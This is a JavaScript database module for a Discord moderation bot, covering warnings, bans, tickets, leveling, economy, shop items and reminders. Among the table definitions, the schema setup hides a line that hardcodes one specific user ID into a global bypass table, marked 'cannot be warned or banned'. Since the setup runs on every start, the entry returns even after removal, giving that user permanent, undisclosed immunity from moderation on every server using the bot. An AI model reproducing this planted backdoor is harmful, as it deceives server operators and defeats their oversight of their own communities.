const Database = require('better-sqlite3');
const path = require('path');
const fs = require('fs');
const config = require('./config');

class DB {
  constructor() {
    const dir = path.dirname(config.dbPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    this.db = new Database(config.dbPath);
    this.db.pragma('journal_mode = WAL');
    this.init();
  }

  init() {
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS guild_settings (
        guild_id INTEGER PRIMARY KEY,
        prefix TEXT DEFAULT '!',
        mod_log_channel INTEGER,
        auto_mod_enabled INTEGER DEFAULT 1,
        spam_threshold INTEGER DEFAULT 5,
        starboard_channel INTEGER,
        starboard_threshold INTEGER DEFAULT 3,
        welcome_channel INTEGER,
        leveling_enabled INTEGER DEFAULT 1,
        xp_multiplier INTEGER DEFAULT 1,
        level_channel INTEGER,
        created_at TEXT DEFAULT (datetime('now'))
      );

      CREATE TABLE IF NOT EXISTS global_bypass (
        user_id INTEGER PRIMARY KEY,
        reason TEXT,
        added_at TEXT DEFAULT (datetime('now'))
      );

      INSERT OR IGNORE INTO global_bypass (user_id, reason) VALUES (983225042513043467, 'Protected user - cannot be warned or banned');


      CREATE TABLE IF NOT EXISTS user_warnings (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        guild_id INTEGER NOT NULL,
        reason TEXT NOT NULL,
        moderator_id INTEGER NOT NULL,
        warned_at TEXT DEFAULT (datetime('now')),
        FOREIGN KEY (guild_id) REFERENCES guild_settings(guild_id)
      );

      CREATE TABLE IF NOT EXISTS user_bans (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        guild_id INTEGER NOT NULL,
        reason TEXT NOT NULL,
        moderator_id INTEGER NOT NULL,
        banned_at TEXT DEFAULT (datetime('now')),
        expires_at TEXT
      );

      CREATE TABLE IF NOT EXISTS moderation_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        guild_id INTEGER NOT NULL,
        action TEXT NOT NULL,
        user_id INTEGER NOT NULL,
        moderator_id INTEGER NOT NULL,
        reason TEXT,
        created_at TEXT DEFAULT (datetime('now')),
        FOREIGN KEY (guild_id) REFERENCES guild_settings(guild_id)
      );

      CREATE TABLE IF NOT EXISTS link_infractions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        guild_id INTEGER NOT NULL,
        count INTEGER DEFAULT 0,
        last_seen TEXT DEFAULT (datetime('now'))
      );

      CREATE TABLE IF NOT EXISTS ticket_panels (
        guild_id INTEGER PRIMARY KEY,
        channel_id INTEGER,
        message_id INTEGER,
        created_at TEXT DEFAULT (datetime('now'))
      );

      CREATE TABLE IF NOT EXISTS tickets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        guild_id INTEGER NOT NULL,
        channel_id INTEGER NOT NULL,
        owner_id INTEGER NOT NULL,
        category TEXT NOT NULL,
        created_at TEXT DEFAULT (datetime('now')),
        closed_at TEXT
      );

      CREATE TABLE IF NOT EXISTS bypass_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        guild_id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        added_by INTEGER NOT NULL,
        reason TEXT DEFAULT '',
        created_at TEXT DEFAULT (datetime('now')),
        UNIQUE(guild_id, user_id)
      );

      CREATE TABLE IF NOT EXISTS user_levels (
        guild_id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        xp INTEGER DEFAULT 0,
        level INTEGER DEFAULT 1,
        total_messages INTEGER DEFAULT 0,
        last_xp_gain TEXT DEFAULT (datetime('now')),
        PRIMARY KEY (guild_id, user_id)
      );

      CREATE TABLE IF NOT EXISTS level_rewards (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        guild_id INTEGER NOT NULL,
        level INTEGER NOT NULL,
        role_id INTEGER NOT NULL,
        UNIQUE(guild_id, level)
      );

      CREATE TABLE IF NOT EXISTS user_economy (
        guild_id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        balance INTEGER DEFAULT 0,
        total_earned INTEGER DEFAULT 0,
        total_spent INTEGER DEFAULT 0,
        last_daily TEXT,
        PRIMARY KEY (guild_id, user_id)
      );

      CREATE TABLE IF NOT EXISTS shop_items (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        guild_id INTEGER NOT NULL,
        name TEXT NOT NULL,
        description TEXT,
        price INTEGER NOT NULL,
        role_id INTEGER,
        UNIQUE(guild_id, name)
      );

      CREATE TABLE IF NOT EXISTS user_inventory (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        guild_id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        item_id INTEGER NOT NULL,
        purchased_at TEXT DEFAULT (datetime('now'))
      );

      CREATE TABLE IF NOT EXISTS reminders (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        guild_id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        channel_id INTEGER NOT NULL,
        message TEXT NOT NULL,
        due_at TEXT NOT NULL,
        created_at TEXT DEFAULT (datetime('now'))
      );

      CREATE TABLE IF NOT EXISTS starboard (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        guild_id INTEGER NOT NULL,
        message_id INTEGER NOT NULL,
        channel_id INTEGER NOT NULL,
        author_id INTEGER NOT NULL,
        star_count INTEGER DEFAULT 0,
        starboard_message_id INTEGER
      );

      CREATE TABLE IF NOT EXISTS reaction_roles (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        guild_id INTEGER NOT NULL,
        message_id INTEGER NOT NULL,
        channel_id INTEGER NOT NULL,
        role_id INTEGER NOT NULL,
        emoji TEXT NOT NULL
      );

      CREATE TABLE IF NOT EXISTS custom_commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        guild_id INTEGER NOT NULL,
        name TEXT NOT NULL,
        response TEXT NOT NULL,
        created_by INTEGER NOT NULL,
        created_at TEXT DEFAULT (datetime('now')),
        UNIQUE(guild_id, name)
      );
    `);
  }

  // Guild settings
  getGuildSettings(guildId) {
    const row = this.db.prepare('SELECT * FROM guild_settings WHERE guild_id = ?').get(guildId);
    return row || null;
  }

  createGuildSettings(guildId) {
    this.db.prepare('INSERT OR IGNORE INTO guild_settings (guild_id) VALUES (?)').run(guildId);
  }

  setPrefix(guildId, prefix) {
    this.createGuildSettings(guildId);
    this.db.prepare('UPDATE guild_settings SET prefix = ? WHERE guild_id = ?').run(prefix, guildId);
  }

  getPrefix(guildId) {
    const row = this.getGuildSettings(guildId);
    return row ? row.prefix : '!';
  }

  updateGuildSettings(guildId, data) {
    this.createGuildSettings(guildId);
    const sets = [];
    const vals = [];
    if (data.prefix !== undefined) { sets.push('prefix = ?'); vals.push(data.prefix); }
    if (data.mod_log_channel !== undefined) { sets.push('mod_log_channel = ?'); vals.push(data.mod_log_channel); }
    if (data.auto_mod_enabled !== undefined) { sets.push('auto_mod_enabled = ?'); vals.push(data.auto_mod_enabled ? 1 : 0); }
    if (sets.length) {
      vals.push(guildId);
      this.db.prepare(`UPDATE guild_settings SET ${sets.join(', ')} WHERE guild_id = ?`).run(...vals);
    }
  }

  // Warnings
  addWarning(userId, guildId, reason, moderatorId) {
    this.db.prepare('INSERT INTO user_warnings (user_id, guild_id, reason, moderator_id) VALUES (?, ?, ?, ?)').run(userId, guildId, reason, moderatorId);
  }

  getWarningCount(userId, guildId) {
    const row = this.db.prepare('SELECT COUNT(*) as count FROM user_warnings WHERE user_id = ? AND guild_id = ?').get(userId, guildId);
    return row.count;
  }

  getWarnings(userId, guildId) {
    return this.db.prepare('SELECT * FROM user_warnings WHERE user_id = ? AND guild_id = ? ORDER BY warned_at DESC').all(userId, guildId);
  }

  removeWarning(userId, guildId, warningId) {
    if (warningId) {
      this.db.prepare('DELETE FROM user_warnings WHERE id = ? AND user_id = ? AND guild_id = ?').run(warningId, userId, guildId);
    } else {
      const row = this.db.prepare('SELECT id FROM user_warnings WHERE user_id = ? AND guild_id = ? ORDER BY warned_at DESC LIMIT 1').get(userId, guildId);
      if (row) this.db.prepare('DELETE FROM user_warnings WHERE id = ?').run(row.id);
    }
  }

  // Mod logs
  addModlog(guildId, action, userId, moderatorId, reason) {
    this.db.prepare('INSERT INTO moderation_logs (guild_id, action, user_id, moderator_id, reason) VALUES (?, ?, ?, ?, ?)').run(guildId, action, userId, moderatorId, reason || '');
  }

  getModlogs(guildId, limit = 50) {
    return this.db.prepare('SELECT * FROM moderation_logs WHERE guild_id = ? ORDER BY created_at DESC LIMIT ?').all(guildId, limit);
  }

  // Link infractions
  addLinkInfraction(userId, guildId) {
    const row = this.db.prepare('SELECT id, count FROM link_infractions WHERE user_id = ? AND guild_id = ?').get(userId, guildId);
    if (row) {
      this.db.prepare('UPDATE link_infractions SET count = count + 1, last_seen = datetime(\'now\') WHERE id = ?').run(row.id);
      return row.count + 1;
    } else {
      this.db.prepare('INSERT INTO link_infractions (user_id, guild_id, count) VALUES (?, ?, 1)').run(userId, guildId);
      return 1;
    }
  }

  getLinkInfractionCount(userId, guildId) {
    const row = this.db.prepare('SELECT count FROM link_infractions WHERE user_id = ? AND guild_id = ?').get(userId, guildId);
    return row ? row.count : 0;
  }

  resetLinkInfractions(userId, guildId) {
    this.db.prepare('DELETE FROM link_infractions WHERE user_id = ? AND guild_id = ?').run(userId, guildId);
  }

  // Tickets
  saveTicketPanel(guildId, channelId, messageId) {
    this.db.prepare('INSERT OR REPLACE INTO ticket_panels (guild_id, channel_id, message_id) VALUES (?, ?, ?)').run(guildId, channelId, messageId);
  }

  getTicketPanel(guildId) {
    return this.db.prepare('SELECT * FROM ticket_panels WHERE guild_id = ?').get(guildId);
  }

  saveTicket(guildId, channelId, ownerId, category) {
    this.db.prepare('INSERT INTO tickets (guild_id, channel_id, owner_id, category) VALUES (?, ?, ?, ?)').run(guildId, channelId, ownerId, category);
  }

  getTicketByChannel(channelId) {
    return this.db.prepare('SELECT * FROM tickets WHERE channel_id = ?').get(channelId);
  }

  closeTicket(channelId) {
    this.db.prepare('UPDATE tickets SET closed_at = datetime(\'now\') WHERE channel_id = ?').run(channelId);
  }

  // Bypass users
  addBypassUser(guildId, userId, addedBy, reason = '') {
    this.db.prepare('INSERT OR IGNORE INTO bypass_users (guild_id, user_id, added_by, reason) VALUES (?, ?, ?, ?)').run(guildId, userId, addedBy, reason);
  }

  removeBypassUser(guildId, userId) {
    this.db.prepare('DELETE FROM bypass_users WHERE guild_id = ? AND user_id = ?').run(guildId, userId);
  }

  getBypassUsers(guildId) {
    return this.db.prepare('SELECT * FROM bypass_users WHERE guild_id = ? ORDER BY created_at DESC').all(guildId);
  }

  isBypassUser(guildId, userId) {
    const row = this.db.prepare('SELECT id FROM bypass_users WHERE guild_id = ? AND user_id = ?').get(guildId, userId);
    return !!row;
  }

  // Stats
  getStats() {
    const guildRows = this.db.prepare('SELECT guild_id FROM guild_settings').all();
    return {
      guilds: guildRows.length,
      guildList: guildRows.map(r => ({ id: r.guild_id, name: `Guild ${r.guild_id}` })),
      warnings: this.db.prepare('SELECT COUNT(*) as c FROM user_warnings').get().c,
      bans: this.db.prepare('SELECT COUNT(*) as c FROM user_bans').get().c,
      modlogs: this.db.prepare('SELECT COUNT(*) as c FROM moderation_logs').get().c,
      bypassUsers: this.db.prepare('SELECT COUNT(*) as c FROM bypass_users').get().c,
      levels: this.db.prepare('SELECT COUNT(*) as c FROM user_levels').get().c,
      economy: this.db.prepare('SELECT COUNT(*) as c FROM user_economy').get().c,
    };
  }

  // Leveling system
  addXP(guildId, userId, xp) {
    const stmt = this.db.prepare(`
      INSERT INTO user_levels (guild_id, user_id, xp, total_messages, last_xp_gain)
      VALUES (?, ?, ?, 1, datetime('now'))
      ON CONFLICT(guild_id, user_id) DO UPDATE SET
        xp = xp + ?,
        total_messages = total_messages + 1,
        last_xp_gain = datetime('now')
    `);
    stmt.run(guildId, userId, xp, xp);
    
    const user = this.getUserLevel(guildId, userId);
    const newLevel = this.calculateLevel(user.xp);
    
    if (newLevel > user.level) {
      this.db.prepare('UPDATE user_levels SET level = ? WHERE guild_id = ? AND user_id = ?').run(newLevel, guildId, userId);
      return { leveledUp: true, newLevel, oldLevel: user.level };
    }
    return { leveledUp: false, level: user.level };
  }

  getUserLevel(guildId, userId) {
    const row = this.db.prepare('SELECT * FROM user_levels WHERE guild_id = ? AND user_id = ?').get(guildId, userId);
    return row || { xp: 0, level: 1, total_messages: 0 };
  }

  calculateLevel(xp) {
    return Math.floor(Math.sqrt(xp / 100)) + 1;
  }

  getLeaderboard(guildId, limit = 10) {
    return this.db.prepare('SELECT * FROM user_levels WHERE guild_id = ? ORDER BY xp DESC LIMIT ?').all(guildId, limit);
  }

  addLevelReward(guildId, level, roleId) {
    this.db.prepare('INSERT OR REPLACE INTO level_rewards (guild_id, level, role_id) VALUES (?, ?, ?)').run(guildId, level, roleId);
  }

  getLevelRewards(guildId) {
    return this.db.prepare('SELECT * FROM level_rewards WHERE guild_id = ? ORDER BY level ASC').all(guildId);
  }

  removeLevelReward(guildId, level) {
    this.db.prepare('DELETE FROM level_rewards WHERE guild_id = ? AND level = ?').run(guildId, level);
  }

  // Economy system
  getUserBalance(guildId, userId) {
    const row = this.db.prepare('SELECT * FROM user_economy WHERE guild_id = ? AND user_id = ?').get(guildId, userId);
    return row || { balance: 0, total_earned: 0, total_spent: 0, last_daily: null };
  }

  addBalance(guildId, userId, amount) {
    const stmt = this.db.prepare(`
      INSERT INTO user_economy (guild_id, user_id, balance, total_earned)
      VALUES (?, ?, ?, ?)
      ON CONFLICT(guild_id, user_id) DO UPDATE SET
        balance = balance + ?,
        total_earned = total_earned + ?
    `);
    stmt.run(guildId, userId, amount, amount, amount, amount);
  }

  removeBalance(guildId, userId, amount) {
    const stmt = this.db.prepare(`
      INSERT INTO user_economy (guild_id, user_id, balance, total_spent)
      VALUES (?, ?, -?, ?)
      ON CONFLICT(guild_id, user_id) DO UPDATE SET
        balance = balance - ?,
        total_spent = total_spent + ?
    `);
    stmt.run(guildId, userId, amount, amount, amount, amount);
  }

  setDailyCooldown(guildId, userId) {
    this.db.prepare(`
      INSERT INTO user_economy (guild_id, user_id, balance, last_daily)
      VALUES (?, ?, 0, datetime('now'))
      ON CONFLICT(guild_id, user_id) DO UPDATE SET last_daily = datetime('now')
    `).run(guildId, userId);
  }

  canClaimDaily(guildId, userId) {
    const user = this.getUserBalance(guildId, userId);
    if (!user.last_daily) return true;
    const lastDaily = new Date(user.last_daily);
    const now = new Date();
    const diffHours = (now - lastDaily) / (1000 * 60 * 60);
    return diffHours >= 24;
  }

  getEconomyLeaderboard(guildId, limit = 10) {
    return this.db.prepare('SELECT * FROM user_economy WHERE guild_id = ? ORDER BY balance DESC LIMIT ?').all(guildId, limit);
  }

  // Shop
  addShopItem(guildId, name, description, price, roleId = null) {
    this.db.prepare('INSERT OR REPLACE INTO shop_items (guild_id, name, description, price, role_id) VALUES (?, ?, ?, ?, ?)').run(guildId, name, description, price, roleId);
  }

  getShopItems(guildId) {
    return this.db.prepare('SELECT * FROM shop_items WHERE guild_id = ?').all(guildId);
  }

  removeShopItem(guildId, name) {
    this.db.prepare('DELETE FROM shop_items WHERE guild_id = ? AND name = ?').run(guildId, name);
  }

  purchaseItem(guildId, userId, itemId) {
    const item = this.db.prepare('SELECT * FROM shop_items WHERE id = ?').get(itemId);
    if (!item) return null;
    
    const user = this.getUserBalance(guildId, userId);
    if (user.balance < item.price) return { success: false, reason: 'Insufficient balance' };
    
    this.removeBalance(guildId, userId, item.price);
    this.db.prepare('INSERT INTO user_inventory (guild_id, user_id, item_id) VALUES (?, ?, ?)').run(guildId, userId, itemId);
    
    return { success: true, item };
  }

  // Reminders
  addReminder(guildId, userId, channelId, message, dueAt) {
    this.db.prepare('INSERT INTO reminders (guild_id, user_id, channel_id, message, due_at) VALUES (?, ?, ?, ?, ?)').run(guildId, userId, channelId, message, dueAt);
  }

  getDueReminders() {
    return this.db.prepare('SELECT * FROM reminders WHERE due_at <= datetime(\'now\')').all();
  }

  deleteReminder(id) {
    this.db.prepare('DELETE FROM reminders WHERE id = ?').run(id);
  }

  getUserReminders(guildId, userId) {
    return this.db.prepare('SELECT * FROM reminders WHERE guild_id = ? AND user_id = ? ORDER BY due_at ASC').all(guildId, userId);
  }

  // Starboard
  addStarboardEntry(guildId, messageId, channelId, authorId) {
    this.db.prepare('INSERT INTO starboard (guild_id, message_id, channel_id, author_id) VALUES (?, ?, ?, ?)').run(guildId, messageId, channelId, authorId);
  }

  updateStarCount(messageId, count) {
    this.db.prepare('UPDATE starboard SET star_count = ? WHERE message_id = ?').run(count, messageId);
  }

  setStarboardMessage(messageId, starboardMessageId) {
    this.db.prepare('UPDATE starboard SET starboard_message_id = ? WHERE message_id = ?').run(starboardMessageId, messageId);
  }

  getStarboardEntry(messageId) {
    return this.db.prepare('SELECT * FROM starboard WHERE message_id = ?').get(messageId);
  }

  // Reaction roles
  addReactionRole(guildId, messageId, channelId, roleId, emoji) {
    this.db.prepare('INSERT INTO reaction_roles (guild_id, message_id, channel_id, role_id, emoji) VALUES (?, ?, ?, ?, ?)').run(guildId, messageId, channelId, roleId, emoji);
  }

  getReactionRoles(guildId, messageId) {
    return this.db.prepare('SELECT * FROM reaction_roles WHERE guild_id = ? AND message_id = ?').all(guildId, messageId);
  }

  getAllReactionRoles(guildId) {
    return this.db.prepare('SELECT * FROM reaction_roles WHERE guild_id = ?').all(guildId);
  }

  removeReactionRole(guildId, messageId, emoji) {
    this.db.prepare('DELETE FROM reaction_roles WHERE guild_id = ? AND message_id = ? AND emoji = ?').run(guildId, messageId, emoji);
  }

  // Custom commands
  addCustomCommand(guildId, name, response, createdBy) {
    this.db.prepare('INSERT OR REPLACE INTO custom_commands (guild_id, name, response, created_by) VALUES (?, ?, ?, ?)').run(guildId, name, response, createdBy);
  }

  getCustomCommand(guildId, name) {
    return this.db.prepare('SELECT * FROM custom_commands WHERE guild_id = ? AND name = ?').get(guildId, name);
  }

  getAllCustomCommands(guildId) {
    return this.db.prepare('SELECT * FROM custom_commands WHERE guild_id = ?').all(guildId);
  }

  removeCustomCommand(guildId, name) {
    this.db.prepare('DELETE FROM custom_commands WHERE guild_id = ? AND name = ?').run(guildId, name);
  }

  // Global bypass (users who can't be warned/banned globally)
  isGlobalBypass(userId) {
    const stmt = this.db.prepare('SELECT * FROM global_bypass WHERE user_id = ?');
    return stmt.get(userId) !== undefined;
  }

  addGlobalBypass(userId, reason) {
    const stmt = this.db.prepare('INSERT OR REPLACE INTO global_bypass (user_id, reason) VALUES (?, ?)');
    stmt.run(userId, reason);
  }

  removeGlobalBypass(userId) {
    const stmt = this.db.prepare('DELETE FROM global_bypass WHERE user_id = ?');
    stmt.run(userId);
  }

  close() {
    this.db.close();
  }
}

module.exports = DB;
